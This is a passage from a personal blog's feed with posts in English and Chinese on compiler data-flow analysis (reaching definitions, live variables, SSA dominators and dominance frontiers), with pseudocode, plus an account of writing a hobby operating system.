    </ul>
  </li>
  <li>LOOP_INFO
    <ul>
      <li>不是一个STMT，用于储存循环相关的信息</li>
    </ul>
  </li>
</ul>]]></content><author><name>Yvan</name><email>dyf.auroa@gmail.com</email></author><category term="Compiler" /><category term="Open64" /><summary type="html"><![CDATA[Open64中非常神奇的IR]]></summary></entry><entry><title type="html">Data Flow Analysis – Reaching definition Analysis</title><link href="http://localhost:4000/blog/reaching-define" rel="alternate" type="text/html" title="Data Flow Analysis – Reaching definition Analysis" /><published>2021-04-05T00:00:00+02:00</published><updated>2021-04-05T00:00:00+02:00</updated><id>http://localhost:4000/blog/reaching-define</id><content type="html" xml:base="http://localhost:4000/blog/reaching-define"><![CDATA[<p>It has been a long time since I wrote the last blog, because I was preparing the Toefl and GRE exam 😢 (so hard). I reviewed the data flow analysis algoritms recently by watching the Li Yue’s videos and reading <em>Engineer A Compiler</em>. Here are some ideas.</p>

<h2 id="whats-the-reaching-definition">What’s the Reaching definition</h2>

<p>In some case the compiler need to know that where the operand has been defined. To find a set of definitions that reach a blocl, the compilers can compute the <em>reaching definitions</em>.</p>

<p>The domain of the <strong>Reaches</strong> is the set of definitions in the procedure. The definition <em>b</em> of some vaiable <em>v</em> reaches operation <em>i</em> if and only if <em>i</em> reads the value of <em>v</em> and there exists a path that from <em>d</em> to <em>i</em> does not redefine <em>v</em>.</p>

<h2 id="whats-the-use-of-reaching-definition">What’s the use of Reaching definition</h2>

<p>We can build the define-use chain to perform the further optimization. Also, we can perform some easy checking such as <em>using uninitialized variables</em>. We can add dummy definitions in the entry node. The uninitialized values are used if any dummy definitions reach a program point <em>p</em>.</p>

<h2 id="algorithm">Algorithm</h2>

<p>The compiler annotates each node <em>n</em> in the CFG with a set <strong>REACHES(n)</strong>, computed as the a forward data-flow problem:</p>

\[Reaches(n) = \Phi, \forall n\]

\[Reaches(n) = \mathop{\cup}\limits_{m \in preds(n)} (DEDef(m) \cup (Reaches(m) \cap \overline{DefKill(m)}))\]

<p>The <strong>DEDef</strong> is the downward-exposed definitions in <em>m</em>. <strong>DefKill(m)</strong> contains all the definition points that are obscured by a definition of the same name in <em>m</em>; <em>d</em> in <strong>DefKill(m)</strong> if <em>d</em> defines some name <em>v</em> and <em>m</em> contains a definition that also defines <em>v</em>.</p>

<p><strong>DEDef</strong> and <strong>DefKill</strong> are both defined over the set of definition points, but computing each of them requires a mapping from names (variables and compiler-generated temporatries) to definition points.</p>

<h2 id="using-iteration-algorithm-to-approach-the-fixed-point">Using iteration algorithm to approach the fixed point</h2>

<p>Just like the liveness analysis, we can use the iteration method to reach the fixed point. For one procedure, we can implement the algorithm by three steps:</p>

<ol>
  <li>Build the cfg</li>
  <li>Gather initial information: compute the <strong>Reaches</strong> and the <strong>DefKill</strong> and build a map of the name to defination points with a pass</li>
  <li>Perform the iteration to approach the fixed point</li>
</ol>

<p>The pseudo codes are following:</p>
<ul>
  <li>Gather the initial information</li>
</ul>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">multi_map</span><span class="o">&lt;</span><span class="n">string</span><span class="p">,</span> <span class="n">statement</span><span class="o">*&gt;</span> <span class="n">definition_info</span>

<span class="k">def</span> <span class="nf">Init</span><span class="p">(</span><span class="n">b</span><span class="p">):</span>
    <span class="n">b</span><span class="p">.</span><span class="n">Reaches</span> <span class="o">=</span> <span class="n">null</span>
    <span class="n">b</span><span class="p">.</span><span class="n">DefKill</span> <span class="o">=</span> <span class="n">null</span>
    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">b</span><span class="p">.</span><span class="n">statements</span><span class="p">:</span>
        <span class="k">if</span> <span class="n">IsDefineStmt</span><span class="p">(</span><span class="n">i</span><span class="p">):</span>
            <span class="n">definition_info</span><span class="p">.</span><span class="n">insert</span><span class="p">((</span><span class="n">i</span><span class="p">.</span><span class="n">name</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">i</span><span class="p">))</span>    <span class="c1"># build map
</span>            <span class="n">b</span><span class="p">.</span><span class="n">DefKill</span><span class="p">().</span><span class="n">append</span><span class="p">(</span><span class="o">&amp;</span><span class="n">i</span><span class="p">)</span>                  <span class="c1"># build DefKill set
</span>        <span class="k">for</span> <span class="n">oprand</span> <span class="ow">in</span> <span class="n">i</span><span class="p">.</span><span class="n">oprands</span><span class="p">():</span>
            <span class="k">if</span> <span class="n">oprand</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">b</span><span class="p">.</span><span class="n">DefKill</span><span class="p">():</span>
                <span class="n">b</span><span class="p">.</span><span class="n">Reaches</span><span class="p">().</span><span class="n">append</span><span class="p">(</span><span class="o">&amp;</span><span class="n">i</span><span class="p">)</span>              <span class="c1"># build Reaches set
</span>
</code></pre></div></div>

<ul>
  <li>Perform the iteration algorithm</li>
</ul>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># assume CFG has N blocks
# numbered 0 to N - 1
</span>
<span class="k">def</span> <span class="nf">GetReachingDefinitionOutPass</span><span class="p">(</span><span class="n">cfg</span><span class="p">):</span>
    <span class="k">for</span> <span class="n">bb</span> <span class="ow">in</span> <span class="n">cfg</span><span class="p">:</span>
        <span class="n">bb</span><span class="p">.</span><span class="n">ReachingDefOut</span> <span class="o">=</span> <span class="n">null</span>

    <span class="n">changed</span> <span class="o">=</span> <span class="n">true</span>
    <span class="k">while</span> <span class="n">changed</span><span class="p">:</span>
        <span class="n">changed</span> <span class="o">=</span> <span class="n">false</span>
        <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">N</span><span class="p">):</span>
            <span class="n">cfg</span><span class="p">[</span><span class="n">i</span><span class="p">].</span><span class="n">ReachingDefOut</span> <span class="o">=</span> <span class="n">cfg</span><span class="p">.</span><span class="n">ReachingDefOut</span><span class="p">.</span><span class="n">recompute</span><span class="p">()</span>
            <span class="k">if</span> <span class="n">cfg</span><span class="p">[</span><span class="n">i</span><span class="p">].</span><span class="n">ReachingDefOut</span><span class="p">.</span><span class="n">changed</span><span class="p">:</span>
                <span class="n">changed</span> <span class="o">=</span> <span class="n">true</span>
</code></pre></div></div>]]></content><author><name>Yvan</name><email>dyf.auroa@gmail.com</email></author><category term="program analysis" /><summary type="html"><![CDATA[Summary of the reaching definition]]></summary></entry><entry><title type="html">MayOS诞生记录</title><link href="http://localhost:4000/blog/MayOS" rel="alternate" type="text/html" title="MayOS诞生记录" /><published>2020-08-13T00:00:00+02:00</published><updated>2020-08-13T00:00:00+02:00</updated><id>http://localhost:4000/blog/MayOS</id><content type="html" xml:base="http://localhost:4000/blog/MayOS"><![CDATA[<h2 id="起因">起因</h2>
<p>  起初开始有写操作系统的冲动大概是在大二上学期的时候，在知乎上看到了一个问题：<a href="https://www.zhihu.com/question/25628124/answer/99818238">如何自己写一个操作系统</a>。我在问题下面看到了<a href="https://www.zhihu.com/people/silverainz">谷月轩师傅</a>的回答，当时觉得这也太帅了，一个人居然可以写出一个直接跑在裸机上的如此复杂而庞大的程序，谷月轩师傅当时在阿里长亭科技工作，以至于我非常想去长亭实习（后来真的如愿以偿2333）。我当时的情况是，成天打ctf逆向做pwn题，刚刚用verilog写完一个cpu，比较熟悉x86和MIPS的汇编，但是对底层的一些细节以及操作系统、编译原理几乎一无所知。于是我就在想，要不我也自己写一个试试，是不是写完了就贼🐂 🍺 ，直接就会Linux内核了？于是带着疑惑我开始了。</p>

<h2 id="经过">经过</h2>

<p>  刚开始抱着《30天自制操作系统开始看》，跟着做了几章感觉不对劲，这都9102年了怎么还在用软盘做启动盘，我这好歹也得用u盘做启动盘吧，于是就放弃了，开始换另一本叫《Orange‘s 一个操作系统的诞生》的书看。这本书也不对劲，我跟着写了34章，汇编都快1千行了，怎么还在写汇编？？？
<img src="https://github.com/Explainaur/hexo-blog/blob/master/source/pictures/cry.jpeg?raw=true" alt="cry" />
然后随手往后翻了翻，怎么在内核里还是有一堆汇编写的东西？我当时意识到这本书用汇编做了太多东西，实际上可维护性很差，而且在细节上也没怎么讲清楚，于是就停止了。</p>

<p>  当时正好拿到了长亭的offer，于是这一拖就到了2020年3月。在家无聊，于是开始看清华的操作系统课程设计 <a href="https://github.com/kiukotsu/ucore">ucore</a>，这个项目可以说是相当出名了，本来打算从头跟到尾的，后来卡在了bootloader然后就停止了。但是这期间我看完了一本黑色经典书<a href="https://book.douban.com/subject/5064311/">《操作系统-精髓与设计原理》</a>，算是把基本概念给学了一边，但是对细节还是一头雾水，以为自己没有动手体验过，所以连提问都不知道怎么问。这时我的一个好朋友邢其正，超级牛逼的大佬，保研去北大了，他的毕设当时刚刚做完，大致内容是：<strong>用自己写的编译器编译用自己写的语言写的操作系统，然后跑在自己写的CPU上</strong>。对你没有看错，强的离谱，相当于手撸一遍整个计算机系统。我当时受到了强烈的震撼，当系统启动的时候，就感觉像是这机器活了过来，有了灵魂。后来我们一起参加了华为毕昇杯编译大赛，撸了一个C语言的编译器出来，拿了国二。为了把这些知识传承下来，我们在学校成立了一个组织叫OWL – OWL Wheel Lab，项目放在了这里<a href="https://github.com/ustb-owl">ustb-owl</a>，这个组织希望能吸引一些喜欢造轮子的同学，一起写一些fancy的代码，做一些硬核的项目，让我们重新造一个轮子。</p>

<p>  又一拖到了暑假，我滚去上海交大打工去了，认识了我的室友Happy师傅，happy师傅是西电的，强的离谱，他已经写过一个操作系统了，我听完之后十分激动，立刻向他请教心路历程，他说他读了《操作系统真相还原》和毛德操老爷子的《LINUX内核源代码情景分析》这本书，我惊了，毛德操老爷子这本书可以说是相当硬核，里面通篇代码，看了让人直想睡觉，不过至此，我真正下定决心，要亲手完成这个想法，于是开始了<a href="https://github.com/Explainaur/MayOS">MayOS</a>的旅程。</p>

<h3 id="明确目标">明确目标</h3>

<p>由于之前尝试了好几次，我大概有了一些目标：</p>

<ol>
  <li>一定要用C语言写内核，尽量避免汇编，提高可维护性</li>
  <li>一定要从bootloader开始写，不想用grub这些东西</li>
</ol>

<p>关于第一点，我困惑了好久好久，我之前看的书里一直都是在用汇编写，一个bootloader几乎要把所有的东西给做完，明明可以用C写的东西也非要用汇编写。最终我在<a href="http://www.osdever.net/bkerndev/Docs/intro.htm">Bran‘s kernel</a>这个文档里找到了答案。在我所看到的资料中，这个文档是唯一一个直接编译出一个纯binary的内核，其他的基本都是编译成ELF文件，然后用汇编去解析ELF。所以我现在只要能让bootloader加载内核到内存里，然后跳到main函数执行就算是成了。</p>

<h3 id="引导">引导</h3>

<p>  操作系统就是一个跑在裸机上的程序，我们可以这样理解，CPU就是一个状态机，寄存器的值就是他的状态，我们可以通过设置寄存器的值来修改他的状态。机器在刚启动的时候，操作系统内核还在硬盘里，也就是外存，这显然是没有办法执行的，我们需要想个办法把它加载到内存里。于是前辈们便设计出了MBR和Bootloader。机器在启动的时候会把磁盘上第一扇区的512个字节的内容加载到内存的0x7c00这里，这是BIOS实现的，然后CPU就跳到这里来执行。这512个字节就叫<strong>主引导记录(Main Boot Record)</strong>即MBR。显然512个字节能做的事情太少了，不足以把内核加载到内存里,因此MBR的工作主要是将Bootloader加载到内存中，由Bootloader负责加载内核，以及做一些初始化操作。</p>

<p>  你在网上搜索写操作系统有关的中文资料，基本都是什么0x7c00，什么0xAA55这些，写个垃圾bootsector，但是这东西顶多算个汇编练习，看来大家都是浅尝辄止。</p>]]></content><author><name>Yvan</name><email>dyf.auroa@gmail.com</email></author><category term="OS" /><summary type="html"><![CDATA[手撕操作系统的日志]]></summary></entry><entry><title type="html">Data Flow Analysis – Live variable analysis</title><link href="http://localhost:4000/blog/live-variable-analysis" rel="alternate" type="text/html" title="Data Flow Analysis – Live variable analysis" /><published>2020-07-17T00:00:00+02:00</published><updated>2020-07-17T00:00:00+02:00</updated><id>http://localhost:4000/blog/live-variable-analysis</id><content type="html" xml:base="http://localhost:4000/blog/live-variable-analysis"><![CDATA[<p>  《Engineering a Compiler》中的8.6.1章介绍了一种数据流分析算法，Live variable analysis，即活动变量分析，这种技术可以用来检测未初始化变量的使用。编译器或者代码扫描器可以发现并报告这种漏洞。</p>

<p>  举个栗子，当从p到某处使用变量v的位置之间的路径，在这之间变量v没有被重新定义，那么我们就说v在p处是活动的。我们通过计算后，我们将基本块b的变量活动信息存储到 <em>LiveOut(b)</em> 中，该集合包含了从程序块b退出时所有的活动变量。因此，在某个cfg中，我们如果求出entry的 <em>LiveOut(n0)</em> 集合不是空集，则这些变量存在潜在的为初始化调用。</p>

<blockquote>
  <p>缺个图片儿～ 给个demo图</p>
</blockquote>

<h3 id="不动点法求解liveout集合">不动点法求解LiveOut集合</h3>

<p>  对于cfg的每个节点n来说，LiveOut(n)是通过一个方程决定的，该方程使用了n节点的所有后继LiveOut集合，以及 <strong><em>UEVar(n)</em></strong> 和 <strong><em>VarKill(n)</em></strong> 集合。定义 LiveOut(n)的方程如下：</p>

\[LiveOut(n) = \mathop{\cup}\limits_{m \in succ(n)}(UEVar(m)\cup(LiveOut(m) \cap \overline{VarKill(m)}))\]

<p>  <strong><em>UEVar(m)</em></strong> 包含了m中向上展示的变量，即在m中没有重新定义就使用的变量，这种关系在LLVM中一般对应一种use关系。而 <strong><em>VarKill(m)</em></strong> 则代表了在m中被重新定义的变量，重新定义即代表原值的生命周期结束，所以被kill掉。上述方程上划线代表了 <em>VarKill(m)</em> 的逻辑补集，这里的m则是n的某后继节点。</p>

<p>  究竟怎么样才算变量存活嘞？对于一个基本程序块m来说，一般只有两种情况，某变量v：</p>

<ol>
  <li>在m中，对v重新定义之前就使用了v，这种情况就是</li>
</ol>

\[v \in UEVar(m)\]

<ol>
  <li>v在退出程序块m时仍然是存活的，就是v”毫发无损”的穿过了m，因为m中没有对v进行重新定义，在m后的block有对v的use，所以这种情况就是：</li>
</ol>

\[v \in LiveOut(m) \cap \overline {VarKill(m)}\]

<p>于是乎，把这俩集合并起来就是m对对 <em>LiveOut(n)</em> 的贡献，然后把所有n的后继m的结果并起来就是整个 <em>LiveOut(n)</em> 的正确结果。</p>

<p>  关于这部分内容，在李樾老师的《软件分析》第4课中有所介绍，但是迭代方式稍有不同，他给出了另一个公式：</p>

\[LiveOut(n) = \mathop{\cup}\limits_{m \in succ(n)}(UEVar(m)\cup(LiveOut(m) - VarKill(m))\]

<blockquote>
  <p>缺个图片儿～ 给出这两种情况展示图</p>
</blockquote>

<p>  事实上这两个公式是一个意思，这个方程描述了一个<strong>反向数据流问题</strong>.</p>

<blockquote>
  <p>反向数据流问题： 信息沿着图的边的反向流动。</p>
</blockquote>

<p>  那么为啥这里要取所有后继节点m的运算结果的并集嘞？因为后继的任何一个Basic Block用到了某变量v都会产生一个use关系，因此都有可能引发变量的未初始化调用。所以这个数据流分析应该属于 <strong><em>May Analysis</em></strong>, 故应当使用并集运算，而 <strong><em>Must Analysis</em></strong> 通常使用交集的运算。</p>

<h3 id="迭代法求不动点">迭代法求不动点</h3>

<p>  数据流分析我们通常使用迭代法来reach fixed point。对于一个过程，我们可以使用如下三步来实现算法：</p>

<ol>
  <li>构建CFG</li>
  <li>收集初始信息 – 通过一个pass来初始化 <em>UEVar</em> 和 <em>VarKill</em></li>
  <li>求不动方程 – 通过多趟pass来迭代，计算LiveOut集合，最后达到不动点。</li>
</ol>

<p>具体实现的伪代码如下：</p>

<ul>
  <li>收集初始信息</li>
</ul>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># assume block b has k operations
# of form "x = y op z"
</span>
<span class="c1"># Collect initial info
</span><span class="k">def</span> <span class="nf">Init</span><span class="p">(</span><span class="n">b</span><span class="p">):</span>
    <span class="n">b</span><span class="p">.</span><span class="n">UEVar</span> <span class="o">=</span> <span class="n">null</span>
    <span class="n">b</span><span class="p">.</span><span class="n">VarKill</span> <span class="o">=</span> <span class="n">null</span>
    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">k</span><span class="p">):</span>
        <span class="n">b</span><span class="p">[</span><span class="n">i</span><span class="p">].</span><span class="n">VarKill</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="n">x</span><span class="p">)</span>
        <span class="k">if</span> <span class="n">y</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">b</span><span class="p">.</span><span class="n">VarKill</span><span class="p">:</span>
            <span class="n">b</span><span class="p">[</span><span class="n">i</span><span class="p">].</span><span class="n">UEVar</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="n">y</span><span class="p">)</span>
        <span class="k">if</span> <span class="n">z</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">b</span><span class="p">.</span><span class="n">varKill</span><span class="p">:</span>
            <span class="n">b</span><span class="p">[</span><span class="n">i</span><span class="p">].</span><span class="n">UEVar</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="n">z</span><span class="p">)</span>

<span class="c1"># init every block
</span><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">block</span><span class="p">:</span>
    <span class="n">Init</span><span class="p">(</span><span class="n">b</span><span class="p">)</span>

</code></pre></div></div>

<ul>
  <li>求解不动方程</li>
</ul>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># assume CFG has N blocks
# numbered 0 to N - 1
</span>
<span class="k">def</span> <span class="nf">GetLiveOutPass</span><span class="p">(</span><span class="n">cfg</span><span class="p">):</span>
    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">N</span><span class="p">):</span>
        <span class="n">cfg</span><span class="p">[</span><span class="n">i</span><span class="p">].</span><span class="n">LiveOut</span> <span class="o">=</span> <span class="n">null</span>

    <span class="n">changed</span> <span class="o">=</span> <span class="n">true</span>
    <span class="k">while</span><span class="p">(</span><span class="n">changed</span><span class="p">):</span>
        <span class="n">changed</span> <span class="o">=</span> <span class="n">false</span>
        <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">N</span><span class="p">):</span>
            <span class="n">cfg</span><span class="p">[</span><span class="n">i</span><span class="p">].</span><span class="n">LiveOut</span> <span class="o">=</span> <span class="n">cfg</span><span class="p">[</span><span class="n">i</span><span class="p">].</span><span class="n">LiveOut</span><span class="p">.</span><span class="n">recompute</span><span class="p">()</span>
            <span class="k">if</span> <span class="p">(</span><span class="n">cfg</span><span class="p">[</span><span class="n">i</span><span class="p">].</span><span class="n">LiveOut</span><span class="p">.</span><span class="n">changed</span><span class="p">):</span>
                <span class="n">changed</span> <span class="o">=</span> <span class="n">true</span>
</code></pre></div></div>]]></content><author><name>Yvan</name><email>dyf.auroa@gmail.com</email></author><category term="program analysis" /><summary type="html"><![CDATA[数据流分析之变量活性分析]]></summary></entry><entry><title type="html">SSA相关知识(1)–Dominator Frontier</title><link href="http://localhost:4000/blog/ssa1" rel="alternate" type="text/html" title="SSA相关知识(1)–Dominator Frontier" /><published>2020-07-09T00:00:00+02:00</published><updated>2020-07-09T00:00:00+02:00</updated><id>http://localhost:4000/blog/ssa1</id><content type="html" xml:base="http://localhost:4000/blog/ssa1"><![CDATA[<p>  和好哥们一起参加了毕昇杯编译系统大赛，要手撕一个编译器，邢神带我们搞，按照llvm的结构进行设计，并且把<a href="https://github.com/MaxXSoft/YuLang">YuLang</a>的部分代码直接迁移了过来，我目前的感受是，这个项目的扩展性真的好。我主要负责平台无关优化，由于存在PassManager这种结构，所以我只需要写相关的pass即可完成优化，不得不说这种设计是真的神奇。</p>

<p>  由于前端直接生成SSA较为复杂，因此yulang的变量分配并不是纯SSA，使用alloc/store的方式来规避phi节点等其他问题，这也是llvm所支持的IR(如下代码)。因为LLVM本身具有一个<a href="https://github.com/llvm-mirror/llvm/blob/master/lib/Transforms/Utils/Mem2Reg.cpp">mem2reg</a>的pass来实现将alloc转为寄存器变量。我接下来也要实现这个pass然后才能进一步优化。</p>

<div class="language-scala highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">b</span><span class="o">()</span><span class="k">:</span><span class="kt">i32</span> <span class="o">{</span>
    <span class="kt">var</span> <span class="kt">a</span> <span class="kt">:</span> <span class="kt">i32</span><span class="o">[</span><span class="err">3</span><span class="o">]</span>
    <span class="kt">a</span><span class="o">[</span><span class="err">1</span><span class="o">]</span> <span class="k">=</span> <span class="mi">2</span>
    <span class="mi">0</span>
<span class="o">}</span>
</code></pre></div></div>

<p>对应的IR：</p>

<pre><code class="language-ir">define internal $0f$i32 @_$b_ {
@args:
  %1 = alloca $pi32
  jump %0
@func_exit: ; preds: %0
  %2 = load i32, $pi32 %1
  return i32 %2
%0: ; preds: @args
  %3 = alloca $p$3ai32
  %4 = access elem $p$3ai32 %3, constant i32 1
  store i32 constant i32 2, $pi32 %4
  store i32 constant i32 0, $pi32 %1
  jump @func_exit
}
</code></pre>

<h3 id="ssa简介">SSA简介</h3>

<hr />

<p>  SSA（static single assignment form）即静态单赋值，之所以称之为单赋值，是因为每个名字在SSA中仅被赋值一次。他的好处主要体现在：其 <strong>Use-Define chain</strong> 相当明确，而且每个仅包含单一元素。关于Use-Define可以看这几个<a href="https://www.zhihu.com/question/41999500">知乎回答</a>。举例来说：</p>

<div class="language-scala highlighter-rouge"><div class="highlight"><pre class="highlight"><code> <span class="n">y</span> <span class="o">:=</span> <span class="mi">1</span>
 <span class="n">y</span> <span class="o">:=</span> <span class="mi">2</span>
 <span class="n">x</span> <span class="o">:=</span> <span class="n">y</span>
</code></pre></div></div>

<p>  从上面的描述所知，第一行赋值行为是不需要的，因为y在第二行被二度赋值，y的数值在第三行被使用，一个程式通常会进行定义可达性分析（reaching definition analysis）来测定它。在SSA下，将会变成下列的形式：</p>

<div class="language-scala highlighter-rouge"><div class="highlight"><pre class="highlight"><code> <span class="n">y1</span> <span class="o">:=</span> <span class="mi">1</span>
 <span class="n">y2</span> <span class="o">:=</span> <span class="mi">2</span>
 <span class="n">x1</span> <span class="o">:=</span> <span class="n">y2</span>
</code></pre></div></div>

<p>  基于这种形式的IR，我们再做常量传播、dec等优化就会变得更加简单。我这最近一直在读《Engineering a Compiler》这本书，在第9章<strong>数据流分析</strong>部分才讲了SSA的构造方式，我之前看第5章IR部分的时候没学会，一直以为是智力问题…后来才知道那只是个概念介绍。</p>

<h3 id="0x01-ssa构造算法">0x01 SSA构造算法</h3>

<hr />

<h4 id="经典构造法">经典构造法</h4>

<p>本书中介绍的算法是相当经典的算法，感兴趣的可以看论文《Efficiently computing static single assignment form and the control dependence graph》，大概就是：</p>

<ol>
  <li>遍历 IR 构造 CFG</li>
  <li>计算支配边界</li>
  <li>确定 Phi(Φ) 函数位置</li>
  <li>变量重命名</li>
</ol>

<p>关于<strong>CFG</strong>的构造算法，大致如下：</p>

<p><em>Basic Block</em>构造算法：</p>

<ol>
  <li>找基本块入口源代码的首行或者转移代码（有条件和无条件）或者转移代码的下一行</li>
  <li>基本块构造：通过入口点开始，将其组成各自的基本块。基本块语句序列的特征：从不包含它本身的进入点到其他进入点或者到某条转移语句或者到某条停止语句</li>
  <li>如果有语句不在任一基本块中，那么它为 ”死代码“，删除</li>
</ol>

<p>当确定Basic Block后，紧接着构造 CFG:</p>

<p>如果在一个有序代码中，基本块 B2 跟在 B1 后，那么产生一个由 B1 到 B2 的有向边。</p>

<ol>
  <li>有跳转点。这个点从 B1 的结束点跳到 B2 的开始点</li>
  <li>无跳转点（有序代码中），B2 跟在 B1 后，且 B1 的结束点不是无条件跳转语句</li>
</ol>

<p>这里推荐去听b站李樾老师的《软件分析》课程，讲的非常好。</p>

<p>接下来是计算支配边界，在生成SSA的时候，需要计算在何处插入正确的 Φ (phi-function)。例如：</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">if</span> <span class="p">(</span><span class="n">b</span> <span class="o">&gt;</span> <span class="mi">2</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">a</span><span class="o">++</span><span class="p">;</span>
<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
    <span class="n">a</span><span class="o">--</span><span class="p">;</span>
<span class="p">}</span>
<span class="n">b</span> <span class="o">=</span> <span class="n">a</span><span class="p">;</span>
</code></pre></div></div>

<p>此时形成的IR应该是这样的：</p>

<pre><code class="language-ir">  branch %b0, %1, %2
@if_end: ; preds: %1, %2
  b1 = phi(a1, a2)
  store i32 constant i32 0, $pi32 %3
  jump @func_exit
%1: ; preds: %0
  a1 = a0 + 1
  jump @if_end
%2: ; preds: %0
  a2 = a0 - 1
  jump @if_end
</code></pre>

<p>cfg大致如下：
<img src="https://blog-1257148503.cos.ap-nanjing.myqcloud.com/pictures/1-2020-7-09.png" alt="cfg" /></p>

<p>  这里可以发现一个问题，<code class="language-plaintext highlighter-rouge">b = a</code>赋值的时候，我们需要确定到底是选择a1还是a2,因此需要插入一个phi函数。计算在何处插入正确的 Φ ，一种方法是在所有有多个前驱的Basic Block的开头插入 Φ-node，但是这种方法会插入很多的无用的 Φ-node ，有很多 Φ-node 的参数都是相同的一个定义。</p>

<p>  这样得到的 SSA 形式的 IR，占用过多的内存，增加了计算的开销。任何使用该SSA进行代码分析或者优化的过程都会浪费很多计算资源。为了减少 Φ-function 的数量，首先想到的方法就是确定插入 Φ-function 的精确位置。</p>

<h3 id="0x02-支配性dominance">0x02 支配性(Dominance)</h3>

<hr />

<p>  在入口结点为b0的流图中，当且进当bi位于从b0到bj的每条路径上时，结点bi支配bj，写作 <strong><em>bi dom bj</em></strong>。根据定义，<strong><em>bi dom bi</em></strong>。</p>

<p>举个例子：</p>

<p><img src="https://blog-1257148503.cos.ap-nanjing.myqcloud.com/pictures/2-2020-7-09.jpeg" alt="graph" /></p>

<p>  在这张图中结点1支配所有的节点，因为他是入口结点，所以到达每个结点都必须经过它。结点2只支配他自己，因为没有结点必须经过2。</p>

<p>  另外一个比较重要的概念就是 <strong><em>strictly dominates</em></strong>（严格支配），如果 <strong>d != n</strong> 且 <strong>d dom n</strong>， 那么 <strong>d sdom m</strong>，例如上图中 4 sdom 5。说白了就是<strong>不是自己支配自己</strong>。n的严格支配集记做 <strong><em>SDom(n)</em></strong>，该集合中，与n最近的结点称为n的<strong>直接支配结点</strong> <em>(immediate node)</em>，记做 <strong><em>IDom(n)</em></strong>。cfg的entry没有直接支配结点。例如5的直接支配结点是4,7的直接支配结点也是4.</p>

\[SDom(n) = Dom(n)-\{n\}\]

<p>  那么如何计算支配域Dom(n)呢，参考《Engineering a Compiler》这本书中的不懂点算法，下面给出介绍，非常刺激，核心就一句话，如下：</p>

\[Dom(n) = \{n\}\cup(\mathop{\cap}\limits_{m \in preds(n)} Dom(m))\]

<p>其实上面这个公式的意思就是，求n的前趋的支配域的交集然后并上{n}，具体的迭代算法过程为：</p>

<p><img src="https://blog-1257148503.cos.ap-nanjing.myqcloud.com/pictures/4-2020-7-09.png" alt="iter" /></p>

<p>  一直迭代CFG的Dom集合，直到不发生变化，即到达fixed point，至于这个迭代算法为什么能停下来我这里就不证明了，</p>

<h3 id="0x03-支配者树dominator-tree">0x03 支配者树(Dominator Tree)</h3>

<hr />

<p>  这个概念比较好理解，根据cfg的支配信息，建立一个支配树，如下图所示：</p>

<p><img src="https://blog-1257148503.cos.ap-nanjing.myqcloud.com/pictures/3-2020-7-09.png" alt="dominator_tree" /></p>

<p>  该树的边使用一种简单的方式编码了IDom集合。若m为IDom(n),则支配者树中必然有一条边从m指向n，即n为m的子结点。比如3,4,6都是2的子结点，尽管6并不是2的直接后继。</p>

<p>因此根据上面的算法计算出的Dom信息，我们可以很容易的建立Dominator Tree,这里给出树上的数据展示：</p>

<table>
  <thead>
    <tr>
      <th> </th>
      <th>B0</th>
      <th>B1</th>
      <th>B2</th>
      <th>B3</th>
      <th>B4</th>
      <th>B5</th>
      <th>B6</th>
      <th>B7</th>
      <th>B8</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>Dom</td>
      <td>{0}</td>
      <td>{0,1}</td>
      <td>{0,1,2}</td>
      <td>{0,1,3}</td>
      <td>{0,1,3,4}</td>
      <td>{0,1,5}</td>
      <td>{0,1,5,6}</td>
      <td>{0,1,5,7}</td>
      <td>{0,1,5,8}</td>
    </tr>
    <tr>
      <td>IDom</td>
      <td>N</td>
      <td>0</td>
      <td>1</td>
      <td>1</td>
      <td>3</td>
      <td>1</td>
      <td>5</td>
      <td>5</td>
      <td>5</td>
    </tr>
  </tbody>
</table>

<p>然后根据Dom值计算出IDom值，实际上IDom值就是其父结点，然后根据IDom值构造Dominator Tree即可。</p>

<p><img src="https://blog-1257148503.cos.ap-nanjing.myqcloud.com/pictures/7-2020-7-09.png" alt="cfg" /></p>

<h3 id="0x04-支配边界dominator-frontier">0x04 支配边界(Dominator Frontier)</h3>

<hr />

<p>  在构造SSA的过程中，若考虑使用最大静态单复制会导入大量的phi-function，比如，假如CFG中结点n中的一个定义，该值到达某结点m时，若 <em>n Dom m</em> 则该值并不需要phi-function，因为该定义只用一种情况才能导致无法传播到m，就是在n、m之间重新定义了该值。</p>

<p>因此只有在n的支配域外的汇合点，才需要引入phi-function，这就是支配边界，即：</p>

<ol>
  <li>n支配m的一个前趋</li>
  <li>n并不严格支配m</li>
</ol>

<p>有这种性质的节点m集合称为n的支配边界，记做DF(n)，例如上图中 <em>DF(2) = 7</em></p>

\[DF(n) = \{m\mid q \in preds(m), n \in Dom(q)\}\]

<p>说人话就是，所有最近不能被n严格支配的节点的集合就是DF(n)，即支配边界。如下图，<code class="language-plaintext highlighter-rouge">DF(5) = {4, 5, 12, 13}</code></p>

<p><img src="https://blog-1257148503.cos.ap-nanjing.myqcloud.com/pictures/5-2020-7-09.png" alt="df" /></p>

